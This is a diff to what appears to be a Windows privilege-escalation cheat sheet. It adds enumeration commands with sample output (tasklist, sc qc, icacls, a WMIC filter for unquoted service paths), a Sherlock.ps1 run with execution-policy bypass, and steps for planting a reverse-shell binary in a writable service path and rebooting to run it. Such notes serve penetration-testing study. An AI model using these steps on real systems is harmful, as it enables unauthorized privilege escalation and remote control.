@@ -628,9 +628,54 @@ $ python3 windows_exploit_suggester.py --update
 $ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
 ```
 
-Sherlock.ps1
+Enum missing software patches - Sherlock.ps1
 1. Copy local `sherlock.ps1` file to remote.
 2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.
+
+### Services - Misconfigured Permissions
+
+Enumerate misconfigured service permissions
+* Exploit by replacing binary with malicious reverse shell binary.
+```
+cmd> tasklist /svc
+vulnservice.exe VulnService
+
+cmd> sc qc vulnservice
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: MEmuSVC
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\path\to\vulnservice.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : VulnService
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+cmd> icacls "C:\Program Files\path\to\vulnservice.exe"
+^LOOK OUT FOR FULL (F) AND WRITE (W)
+
+Everyone:(I)(F)
+BUILTIN\Administrators:(I)(F)
+BUILTIN\Users:(I)(F)
+CHIMERA\steph:(I)(F)
+```
+
+### Services - Unquoted Paths
+
+Find unquoted paths with WMIC:
+* Find all services with "auto" start mode (automatically starts at system start-up),
+```
+cmd> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+``` 
+
+Exploit steps:
+1. Find unquoted service binpaths, for services run as ADMIN e.g. `binpath= C:\Program Files\A bad folder\adminservice.exe`.
+2. Check if you have FULL/WRITE `(F)(W)` permissions along path `icacls "C:\Program Files\folder\A bad folder\adminservice.exe"`.
+3. Generate reverse shell payload and rename to path e.g. `A.exe`.
+4. Place malicious binary in path, so that it is executed e.g. `move A.exe "C:\Program Files\folder"`.
+5. Execute by restarting computer (if service has startmode = auto) with `shutdown /r /t 0`.
 
 ### User Account Control (UAC) Bypass
 
